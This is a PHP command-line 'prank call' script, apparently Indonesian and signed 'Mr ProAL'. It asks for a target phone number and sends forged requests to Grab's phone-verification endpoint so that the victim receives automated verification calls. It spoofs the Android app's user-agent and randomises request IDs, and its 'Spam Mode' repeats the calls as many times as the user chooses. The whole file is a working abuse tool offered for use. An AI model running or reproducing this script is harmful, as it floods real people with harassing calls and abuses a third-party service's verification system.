<?php
// Gw ganteng
shell_exec('clear'); 
function get(){ 
return trim(fgets(STDIN)); } 
class prankcall{ 
public function __construct($no){ $this->number = $no; } 
private function get(){ return trim(fgets(STDIN)); } 
private function correct($no){ $cek = substr($no,0,2); 
if($cek=="08"){ $no = "62".substr($no,1); } return $no; } 
private function ekse(){ $no = $this->correct($this->number); $rand = rand(0123456,9999999); $rands = $this->randStr(12); $post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production"; $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands"; $h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8"; $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)"; $h[] = "Content-Type: application/x-www-form-urlencoded"; $h[] = "Content-Length: ".strlen($post); $h[] = "Host: api.grab.com"; $h[] = "Connection: close"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post); curl_setopt($ch, CURLOPT_HTTPHEADER, $h); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $x = curl_exec($ch); curl_close($ch); $ekse = json_decode($x,true); if(empty($ekse['challengeID'])){ echo " [•] \e[1;31mAwokAwokAwokAwok Gagal\n\n"; }else{ echo " \e[1;32m[√] \e[1;93m Anjay Sukses Bred\n\n"; } } private function loop($many,$sleep=null){ $a=0; $no = $this->correct($this->number); while($a<$many){ $rand = rand(0123456,9999999); $rands = $this->randStr(12); $post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production"; $h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands"; $h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8"; $h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)"; $h[] = "Content-Type: application/x-www-form-urlencoded"; $h[] = "Content-Length: ".strlen($post); $h[] = "Host: api.grab.com"; $h[] = "Connection: close"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post); curl_setopt($ch, CURLOPT_HTTPHEADER, $h); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $x = curl_exec($ch); curl_close($ch); $ekse = json_decode($x,true); if(empty($ekse['challengeID'])){ continue; }else{ $nn = $a+1; echo "\e[1;32m [$nn] Otw bred \r"; $a++; } if($sleep!=null) sleep($sleep); if($a>=$many) echo "\n \e[1;32m[√] \e[1;93mSelesai blog!\n\n"; } } private function randStr($l){ $data = "abcdefghijklmnopqrstuvwxyz1234567890"; $word = ""; for($a=0;$a<$l;$a++){ $word .= $data{rand(0,strlen($data)-1)}; } return $word; } public function run(){ while(true){ echo " [+] Spam Mode yeuh? (y/n): "; $loop = $this->get(); if($loop=="y" OR $loop=="n"){ break; }else{ echo "Dasar Bocah Noob n\n"; continue; } } if($loop=="y"){ echo " [+] Arek beraha Spamna: "; $many = $this->get(); $this->loop($many); }else{ $this->ekse(); } } } 
echo " \n\n\n\n\n\n\n\n"; echo " \n\n\n\n\n\n\n\n"; echo "\n\n\n\n\n\n\n\n"; echo "\n"; echo " \n"; echo " \n"; 
echo "\e[1;32m
  
11011011001010101001001000101111110000101111110111
01011000110011010000000100111011111010010110010001
10111000000100000010111110010111001011101110000100
10111111011111011100101000101010100101100010011010
11000100010011001001101011011111111011010010000111
00011011101010111110111010010110101101011111010010
10100011001000110101000001101111010110000101000111
10011010011101001111100101101000010001111110111100
01100010001000101011111010011111001110011000001111
11011101010101100001100110100101001011111010111011
11001000000011000010010111010100100010101000110001
10110010001101101010010010010110100101000100111001
01110000110001000011010001000001001110101001100010
00100010010000111001000000111011011011011110000010
01001100111000110011110100010001100011011101110000
01001110001011011000011111011101010111100100100000
10100000001010100010010101001101111110110100101011
00010111110111011101110011001101010101000111100000
01010011001011111010111011010001100111111010000111
01001101101100100001011101111110010101111000101000
1111000011000011011000011011011111111101100
   \e[1;96m   ┌─┐┌─┐┌─┐┌┬┐┌─┐┌─┐┬  ┬ \e[1;32m    
    \e[1;96m  └─┐├─┘├─┤││││  ├─┤│  │    \e[1;32m 
     \e[1;96m └─┘┴  ┴ ┴┴ ┴└─┘┴ ┴┴─┘┴─┘   \e[1;32m 
               \e[0;90mBy: Mr ProAL\e[1;32m  
                                  
"; system ('echo'); sleep ('0.4'); echo " [+] No Target: "; $no = get(); $n = new prankCall($no); $n->run(); 
?>
